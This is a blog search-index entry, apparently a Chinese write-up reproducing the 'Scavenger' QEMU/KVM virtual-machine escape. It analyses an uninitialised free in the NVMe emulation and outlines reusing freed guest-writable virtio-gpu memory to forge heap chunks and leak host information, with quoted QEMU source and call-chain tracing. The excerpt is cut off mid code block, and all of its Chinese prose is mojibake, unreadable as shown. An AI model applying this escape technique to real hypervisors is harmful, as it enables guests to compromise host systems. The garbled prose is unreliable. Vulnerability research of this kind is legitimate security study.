<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Misuse Error Handling Leading To QEMU/KVM Escape</title>
    <link href="/2023/10/12/ErrorHandling/"/>
    <url>/2023/10/12/ErrorHandling/</url>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œå¤ç°ã€ŠScavengerï¼šMisuse Error Handling Leading To QEMU&#x2F;KVM Escapeã€‹ï¼Œè™½ç„¶æ²¡æœ‰CVEï¼Œä½†ä¹Ÿæ˜¯ç¡®ç¡®å®å®å­˜åœ¨è¿‡å¯ä»¥åˆ©ç”¨çš„æ¼æ´ã€‚</p><p>å…·ä½“å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/373084566">https://zhuanlan.zhihu.com/p/373084566</a>  ã€ <a href="https://github.com/hustdebug/scavenger">https://github.com/hustdebug/scavenger</a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="æ¼æ´å‡½æ•°"><a href="#æ¼æ´å‡½æ•°" class="headerlink" title="æ¼æ´å‡½æ•°"></a>æ¼æ´å‡½æ•°</h3><p>åœ¨<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/hw/block/nvme.c#L141">nvme_map_prpå‡½æ•°</a>ä¸­è¿è¡Œåˆ°pci_dma_sglist_init æœ‰<code>qsg-&gt;sg = g_malloc(alloc_hint * sizeof(ScatterGatherEntry))</code>ï¼Œä¸ºqsg-&gt;sgåˆ†é…ä¸€ä¸ªå †åœ°å€ï¼›æ¥ç€è¿è¡Œåˆ°<code>if (unlikely(!prp2))</code>æ—¶ï¼Œprp2ä¸º0ï¼Œé€šè¿‡åˆ¤æ–­ç›´æ¥è·³è½¬åˆ°unmapå»æ‰§è¡Œqemu_sglist_destroyå‡½æ•°ï¼Œ qemu_sglist_destroyå‡½æ•°ä¸­æœ‰<code>g_free(qsg-&gt;sg)</code>é‡Šæ”¾å †å†…å­˜ã€‚ä½†æ˜¯è¿è¡Œåˆ°çš„æ˜¯qemu_iovec_initå‡½æ•°ï¼Œqsg-&gt;sgä¸­å°±æ˜¯ä¸€ä¸ªæœªåˆå§‹åŒ–çš„å€¼ï¼Œæ¥ç€è·³è½¬åˆ°unmapå»æ‰§è¡Œqemu_sglist_destroyå‡½æ•°ä¹Ÿä¼šé‡Šæ”¾è¿™ä¸ªæœªåˆå§‹åŒ–çš„å€¼ï¼Œå¦‚æœè¿™ä¸ªæœªåˆå§‹åŒ–çš„å€¼æ˜¯ä¸€å—å¯ä¾›è™šæ‹Ÿæœºç›´æ¥è¯»å†™çš„å†…å­˜åœ°å€å°±å¯ä»¥å¯¹æ¼æ´è¿›ä¸€æ­¥åˆ©ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_map_prp</span><span class="hljs-params">(QEMUSGList *qsg, QEMUIOVector *iov, <span class="hljs-type">uint64_t</span> prp1,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> prp2, <span class="hljs-type">uint32_t</span> len, NvmeCtrl *n)</span><br>&#123;<br>    hwaddr trans_len = n-&gt;page_size - (prp1 % n-&gt;page_size);<br>    trans_len = MIN(len, trans_len);<br>    <span class="hljs-type">int</span> num_prps = (len &gt;&gt; n-&gt;page_bits) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!prp1)) &#123;<br>        trace_nvme_err_invalid_prp();<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n-&gt;cmbsz &amp;&amp; prp1 &gt;= n-&gt;ctrl_mem.addr &amp;&amp;<br>               prp1 &lt; n-&gt;ctrl_mem.addr + int128_get64(n-&gt;ctrl_mem.size)) &#123;<br>        qsg-&gt;nsg = <span class="hljs-number">0</span>;<br>        qemu_iovec_init(iov, num_prps);<br>        qemu_iovec_add(iov, (<span class="hljs-type">void</span> *)&amp;n-&gt;cmbuf[prp1 - n-&gt;ctrl_mem.addr], trans_len);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        pci_dma_sglist_init(qsg, &amp;n-&gt;parent_obj, num_prps);<br>        qemu_sglist_add(qsg, prp1, trans_len);<br>    &#125;<br>    len -= trans_len;<br>    <span class="hljs-keyword">if</span> (len) &#123;<br>        <span class="hljs-keyword">if</span> (unlikely(!prp2)) &#123;<br>            trace_nvme_err_invalid_prp2_missing();<br>            <span class="hljs-keyword">goto</span> unmap;<br>        &#125;<br>        â€¦â€¦â€¦â€¦â€¦â€¦<br>        â€¦â€¦â€¦â€¦â€¦â€¦<br>        <br>    &#125;<br>    <span class="hljs-keyword">return</span> NVME_SUCCESS;<br><br> unmap:<br>    qemu_sglist_destroy(qsg);<br>    <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_sglist_destroy</span><span class="hljs-params">(QEMUSGList *qsg)</span><br>&#123;<br>    object_unref(OBJECT(qsg-&gt;dev));<br>    g_free(qsg-&gt;sg);<br>    <span class="hljs-built_in">memset</span>(qsg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*qsg));<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å®Œå…¨å‚è€ƒGaoningå¤§ä½¬çš„æ€è·¯åšå‡ºçš„åˆ†æï¼Œå»ºè®®ç›´æ¥çœ‹å¼€å¤´æ¨èçš„é“¾æ¥ï¼Œè‡ªå·±è¿™é‡Œå†™è¿™ç¯‡æ–‡ç« çº¯ç²¹æ˜¯æ€•è‡ªå·±é—å¿˜ã€‚</p><h3 id="ç¡®å®šä¸Šå±‚å‡½æ•°"><a href="#ç¡®å®šä¸Šå±‚å‡½æ•°" class="headerlink" title="ç¡®å®šä¸Šå±‚å‡½æ•°"></a>ç¡®å®šä¸Šå±‚å‡½æ•°</h3><p>nvme_map_prpçš„ä¸Šå±‚è°ƒç”¨æœ‰ä¸‰ä¸ªå‡½æ•°ï¼šnvme_dma_write_prpã€nvme_dma_read_prpå’Œnvme_rwã€‚</p><p>nvme_dma_write_prpå’Œnvme_dma_read_prpä¸­çš„qsgéƒ½æ˜¯æ ˆä¸Šçš„å˜é‡ï¼Œå­˜åœ¨äºæ ˆä¸Šçš„æ•°æ®å¯¼è‡´æ— æ³•å»æ§åˆ¶qsg-&gt;sgä¸­çš„æœªåˆå§‹åŒ–å˜é‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_dma_write_prp</span><span class="hljs-params">(NvmeCtrl *n, <span class="hljs-type">uint8_t</span> *ptr, <span class="hljs-type">uint32_t</span> len,</span><br><span class="hljs-params">                                   <span class="hljs-type">uint64_t</span> prp1, <span class="hljs-type">uint64_t</span> prp2)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">if</span> (nvme_map_prp(&amp;qsg, &amp;iov, prp1, prp2, len, n)) &#123;<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åçš„nvme_rwä¸­çš„qsgå°±æ˜¯å­˜åœ¨äºå †ä¸Šçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nvme_process_sq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">while</span> (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&amp;sq-&gt;req_list))) &#123;<br>        addr = sq-&gt;dma_addr + sq-&gt;head * n-&gt;sqe_size;<br>        nvme_addr_read(n, addr, (<span class="hljs-type">void</span> *)&amp;cmd, <span class="hljs-keyword">sizeof</span>(cmd));<br>        nvme_inc_sq_head(sq);<br><br>        req = QTAILQ_FIRST(&amp;sq-&gt;req_list);<br>        QTAILQ_REMOVE(&amp;sq-&gt;req_list, req, entry);<br>        QTAILQ_INSERT_TAIL(&amp;sq-&gt;out_req_list, req, entry);<br>        <span class="hljs-built_in">memset</span>(&amp;req-&gt;cqe, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req-&gt;cqe));<br>        req-&gt;cqe.cid = cmd.cid;<br><br>        status = sq-&gt;sqid ? nvme_io_cmd(n, &amp;cmd, req) :<br>            nvme_admin_cmd(n, &amp;cmd, req);<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_io_cmd</span><span class="hljs-params">(NvmeCtrl *n, NvmeCmd *cmd, NvmeRequest *req)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">case</span> NVME_CMD_READ:<br>        <span class="hljs-keyword">return</span> nvme_rw(n, ns, cmd, req);<br>    <span class="hljs-keyword">default</span>:<br>        trace_nvme_err_invalid_opc(cmd-&gt;opcode);<br>        <span class="hljs-keyword">return</span> NVME_INVALID_OPCODE | NVME_DNR;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_rw</span><span class="hljs-params">(NvmeCtrl *n, NvmeNamespace *ns, NvmeCmd *cmd,</span><br><span class="hljs-params">    NvmeRequest *req)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">if</span> (nvme_map_prp(&amp;req-&gt;qsg, &amp;req-&gt;iov, prp1, prp2, data_size, n)) &#123;<br>        block_acct_invalid(blk_get_stats(n-&gt;conf.blk), acct);<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è·¨åŸŸæ”»å‡»"><a href="#è·¨åŸŸæ”»å‡»" class="headerlink" title="è·¨åŸŸæ”»å‡»"></a>è·¨åŸŸæ”»å‡»</h3><p>virtio_gpu_create_mapping_iovå‡½æ•°ä¸­dma_memory_mapå°†è™šæ‹Ÿæœºç‰©ç†å†…å­˜æ˜ å°„qemuä¸­çš„åˆ†é…ç»™è™šæ‹ŸæœºçœŸå®å†…å­˜ï¼Œ(*iov)[i].iov_baseä¸­çš„åœ°å€å°±æ˜¯åˆ†é…ç»™è™šæ‹Ÿæœºçš„åœ°å€ï¼Œè™šæ‹Ÿæœºå¯ä»¥ç›´æ¥å¯¹å…¶è¯»å†™</p><img src="/img/22/Screenshot 2023-10-18 152610.png" style="zoom:80%;" /><p>åœ¨*iové‡Šæ”¾åï¼Œæ¥ç€è¢«qsgç”³è¯·ï¼Œåˆ©ç”¨æ®‹ç•™çš„åœ°å€ï¼Œä½¿ç”¨ä¸Šé¢çš„æ¼æ´å»é‡Šæ”¾è¯¥å†…å­˜ï¼Œåœ¨è™šæ‹Ÿæœºä¸­å¯ä»¥ç›´æ¥å¯¹è¯¥å†…å­˜è¯»å†™ï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å»ä¼ªé€ chunkã€æ³„æ¼ä¿¡æ¯ï¼Œä»…ä»…é€šè¿‡åœ¨è™šæ‹Ÿæœºä¸­çš„è¯»å†™å†…å­˜ï¼Œè¿›è€Œè·¨åŸŸå½±å“åˆ°qemuã€‚</p><h2 id="ç›¸å…³å‡½æ•°çš„è°ƒç”¨"><a href="#ç›¸å…³å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="ç›¸å…³å‡½æ•°çš„è°ƒç”¨"></a>ç›¸å…³å‡½æ•°çš„è°ƒç”¨</h2><p>çŸ¥é“éœ€è¦ä½¿ç”¨virtio_gpu_create_mapping_iovå‡½æ•°å»è®¾ç½®Mapping Tableåï¼Œæ¥ä¸‹æ¥å°±è¦ææ¸…æ¥šæ€æ ·å»è°ƒç”¨å®ƒã€‚</p><p>å½“æ—¶æˆ‘å°è¯•è‡ªå·±å»æ‰¾ä¸Šå±‚è°ƒç”¨é“¾ï¼Œå’Œä¹‹å‰ä¸€æ ·æœ€åæ‰¾åˆ°virtio_gpu_ctrl_bhè¿™ä¸ªåº•åŠéƒ¨ï¼ˆbottom halfï¼‰å‡½æ•°ï¼Œé€šè¿‡virtio_gpu_handle_ctrl_cbå°±å¯ä»¥è§¦å‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_handle_ctrl_cb</span><span class="hljs-params">(VirtIODevice *vdev, VirtQueue *vq)</span><br>&#123;<br>    VirtIOGPU *g = VIRTIO_GPU(vdev);<br>    qemu_bh_schedule(g-&gt;ctrl_bh);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨virtio-gpu.cè¿™ä¸ªæ–‡ä»¶ä¸­æ ¹æœ¬å°±æ‰¾ä¸åˆ°virtio_gpu_handle_ctrl_cbçš„ä¸Šå±‚å‡½æ•°ï¼Œä¹Ÿæ‰¾ä¸åˆ°è®¾å¤‡æ³¨å†Œçš„ç›¸å…³å‡½æ•°ï¼Œå½“æ—¶ç›´æ¥è‡ªé—­ï¼Œæœ€åæ˜¯å‚è€ƒGaoningå¤§ä½¬çš„<a href="https://github.com/hustdebug/scavenger/blob/main/exploit/exp.c">exp</a>ä¸­è®¾ç½®çš„å‚æ•°æ‰ææ˜ç™½ï¼ˆäº‹åè¯¸è‘›ğŸ¤¡ï¼‰ã€‚</p><p>virtio_gpu_device_realizeä¸­ä¼šè°ƒç”¨virtio_gpu_base_device_realizeå‡½æ•°ï¼Œä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºè¿™ä¸ªå‡½æ•°è·Ÿvirtio_gpu_handle_ctrl_cbçš„è°ƒç”¨æ²¡å¤šå¤§å…³ç³»ï¼Œä½†æ˜¯è¿›å…¥virtio_gpu_base_device_realizeå‡½æ•°åè¿›ä¸€æ­¥è°ƒç”¨virtio_add_queueå‡½æ•°ï¼Œåœ¨virtio_add_queueå‡½æ•°ä¸­ä¼šå°†virtio_gpu_handle_ctrl_cbå‡½æ•°çš„åœ°å€èµ‹å€¼ç»™<code>vdev-&gt;vq[i].handle_output</code>ï¼Œä¹Ÿå°±æ˜¯åç»­virtio_gpu_handle_ctrl_cbçš„è°ƒç”¨å¯ä»¥é€šè¿‡<code>vdev-&gt;vq[i].handle_output</code>å»è§¦å‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_device_realize</span><span class="hljs-params">(DeviceState *qdev, Error **errp)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>    <span class="hljs-keyword">if</span> (!virtio_gpu_base_device_realize(qdev,<br>                                        virtio_gpu_handle_ctrl_cb,<br>                                        virtio_gpu_handle_cursor_cb,<br>                                        errp)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    g-&gt;ctrl_vq = virtio_get_queue(vdev, <span class="hljs-number">0</span>);<br>    g-&gt;cursor_vq = virtio_get_queue(vdev, <span class="hljs-number">1</span>);<br>    g-&gt;ctrl_bh = qemu_bh_new(virtio_gpu_ctrl_bh, g);<br>    g-&gt;cursor_bh = qemu_bh_new(virtio_gpu_cursor_bh, g);<br>    QTAILQ_INIT(&amp;g-&gt;reslist);<br>    QTAILQ_INIT(&amp;g-&gt;cmdq);<br>    QTAILQ_INIT(&amp;g-&gt;fenceq);<br>&#125;<br><br><span class="hljs-type">bool</span><br><span class="hljs-title function_">virtio_gpu_base_device_realize</span><span class="hljs-params">(DeviceState *qdev,</span><br><span class="hljs-params">                               VirtIOHandleOutput ctrl_cb,</span><br><span class="hljs-params">                               VirtIOHandleOutput cursor_cb,</span><br><span class="hljs-params">                               Error **errp)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">if</span> (virtio_gpu_virgl_enabled(g-&gt;conf)) &#123;<br>        <span class="hljs-comment">/* use larger control queue in 3d mode */</span><br>        virtio_add_queue(vdev, <span class="hljs-number">256</span>, ctrl_cb);<br>        virtio_add_queue(vdev, <span class="hljs-number">16</span>, cursor_cb);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        virtio_add_queue(vdev, <span class="hljs-number">64</span>, ctrl_cb);<br>        virtio_add_queue(vdev, <span class="hljs-number">16</span>, cursor_cb);<br>    &#125;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>&#125;<br><br>VirtQueue *<span class="hljs-title function_">virtio_add_queue</span><span class="hljs-params">(VirtIODevice *vdev, <span class="hljs-type">int</span> queue_size,</span><br><span class="hljs-params">                            VirtIOHandleOutput handle_output)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; VIRTIO_QUEUE_MAX; i++) &#123;<br>        <span class="hljs-keyword">if</span> (vdev-&gt;vq[i].vring.num == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (i == VIRTIO_QUEUE_MAX || queue_size &gt; VIRTQUEUE_MAX_SIZE)<br>        <span class="hljs-built_in">abort</span>();<br><br>    vdev-&gt;vq[i].vring.num = queue_size;<br>    vdev-&gt;vq[i].vring.num_default = queue_size;<br>    vdev-&gt;vq[i].vring.align = VIRTIO_PCI_VRING_ALIGN;<br>    vdev-&gt;vq[i].handle_output = handle_output;<br>    vdev-&gt;vq[i].handle_aio_output = <span class="hljs-literal">NULL</span>;<br>    vdev-&gt;vq[i].used_elems = g_malloc0(<span class="hljs-keyword">sizeof</span>(VirtQueueElement) *<br>                                       queue_size);<br><br>    <span class="hljs-keyword">return</span> &amp;vdev-&gt;vq[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨hw&#x2F;virtio&#x2F;virtio-pci.cä¸­çš„virtio_pci_notify_writeå‡½æ•°è°ƒç”¨virtio_queue_notifyï¼Œæ¥ç€è°ƒç”¨<code>vq-&gt;handle_output(vdev, vq)</code>å°±å¯ä»¥è¿›å…¥virtio_gpu_handle_ctrl_cbå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_pci_notify_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr,</span><br><span class="hljs-params">                                    <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    VirtIODevice *vdev = opaque;<br>    VirtIOPCIProxy *proxy = VIRTIO_PCI(DEVICE(vdev)-&gt;parent_bus-&gt;parent);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-built_in">queue</span> = addr / virtio_pci_queue_mem_mult(proxy);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span> &lt; VIRTIO_QUEUE_MAX) &#123;<br>        virtio_queue_notify(vdev, <span class="hljs-built_in">queue</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">virtio_queue_notify</span><span class="hljs-params">(VirtIODevice *vdev, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    VirtQueue *vq = &amp;vdev-&gt;vq[n];<br><br>    <span class="hljs-keyword">if</span> (unlikely(!vq-&gt;vring.desc || vdev-&gt;broken)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);<br>    <span class="hljs-keyword">if</span> (vq-&gt;host_notifier_enabled) &#123;<br>        event_notifier_set(&amp;vq-&gt;host_notifier);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (vq-&gt;handle_output) &#123;<br>        vq-&gt;handle_output(vdev, vq);<br><br>        <span class="hljs-keyword">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;<br>            virtio_set_started(vdev, <span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨virtio-pci.cä¸­å¯ä»¥å¾ˆå®¹æ˜“å»æ‰¾åˆ°è®¾å¤‡çš„æ³¨å†Œå’Œè¯»å†™å‡½æ•°ã€‚</p><p>â€‹                                              </p><p>ä¹‹åè¿›å…¥virtio_gpu_handle_ctrlå‡½æ•°å°±ä¼šè°ƒç”¨virtqueue_popæ¥å¾—åˆ°cmdï¼Œåœ¨virtqueue_popä¸­è¿›ä¸€æ­¥è°ƒç”¨virtqueue_split_pop</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_handle_ctrl</span><span class="hljs-params">(VirtIODevice *vdev, VirtQueue *vq)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    cmd = virtqueue_pop(vq, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command));<br>    <span class="hljs-keyword">while</span> (cmd) &#123;<br>        cmd-&gt;vq = vq;<br>        cmd-&gt;error = <span class="hljs-number">0</span>;<br>        cmd-&gt;finished = <span class="hljs-literal">false</span>;<br>        QTAILQ_INSERT_TAIL(&amp;g-&gt;cmdq, cmd, next);<br>        cmd = virtqueue_pop(vq, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command));<br>    &#125;<br><br>    virtio_gpu_process_cmdq(g);<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">virtqueue_pop</span><span class="hljs-params">(VirtQueue *vq, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (unlikely(vq-&gt;vdev-&gt;broken)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (virtio_vdev_has_feature(vq-&gt;vdev, VIRTIO_F_RING_PACKED)) &#123;<br>        <span class="hljs-keyword">return</span> virtqueue_packed_pop(vq, sz);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> virtqueue_split_pop(vq, sz);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>virtqueue_split_popå‡½æ•°å°±æ˜¯è®¾ç½®Mapping Tableä¸­æ•°æ®çš„å…³é”®å‡½æ•°ï¼Œä¸»è¦å°†vq-&gt;vring-&gt;descè™šæ‹Ÿæœºç‰©ç†åœ°å€ä¸­çš„VirtIODeviceç»“æ„ä½“ç»è¿‡ä¸€äº›åˆ¤æ–­å¤„ç†åèµ‹å€¼ç»™elemï¼Œå…·ä½“çœ‹æºç å’Œæ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 